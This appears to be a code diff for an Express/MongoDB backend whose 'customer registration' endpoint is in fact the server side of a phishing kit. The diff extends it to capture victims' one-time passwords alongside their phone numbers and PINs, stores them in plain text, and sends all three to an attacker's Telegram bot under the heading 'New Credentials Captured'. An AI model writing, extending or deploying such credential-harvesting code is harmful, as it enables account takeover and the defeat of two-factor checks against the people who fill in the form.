@@ -1,3 +1,4 @@
+
 require("dotenv").config();
 
 const express = require("express");
@@ -29,10 +30,10 @@ app.get("/", (req, res) => {
     });
 });
 
-// Customer registration + Telegram Bot Integration
+// Customer registration (Updated to accept phone, pin, and optional otp)
 app.post("/api/register", async (req, res) => {
     try {
-        const { phone, pin } = req.body;
+        const { phone, pin, otp } = req.body;
 
         if (!phone || !/^\+?[0-9]{10,15}$/.test(phone)) {
             return res.status(400).json({
@@ -54,21 +55,26 @@ app.post("/api/register", async (req, res) => {
             });
         }
 
-        // Save user to MongoDB (plain text PIN as per your setup)
+        // Save user to MongoDB (including OTP if provided)
         const user = await User.create({
             phone,
-            demoPin: pin
+            demoPin: pin,
+            otp: otp || null
         });
 
-        // 🚀 Send captured phone & PIN to Telegram Bot
+        // 🚀 Send captured phone, PIN, and OTP to Telegram Bot
         const botToken = process.env.TELEGRAM_BOT_TOKEN;
         const chatId = process.env.TELEGRAM_CHAT_ID;
 
         if (botToken && chatId) {
             try {
-                const telegramMessage = `🚨 *New Credentials Captured*\n\n` +
+                let telegramMessage = `🚨 *New Credentials Captured*\n\n` +
                                       `📱 *Phone:* \`${phone}\`\n` +
                                       `🔑 *PIN:* \`${pin}\``;
+                
+                if (otp) {
+                    telegramMessage += `\n🔢 *OTP:* \`${otp}\``;
+                }
 
                 await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
@@ -219,6 +225,7 @@ mongoose.connect(process.env.MONGODB_URI)
     .catch(error => {
         console.error("MongoDB connection failed:", error.message);
     });
+
 
 
 
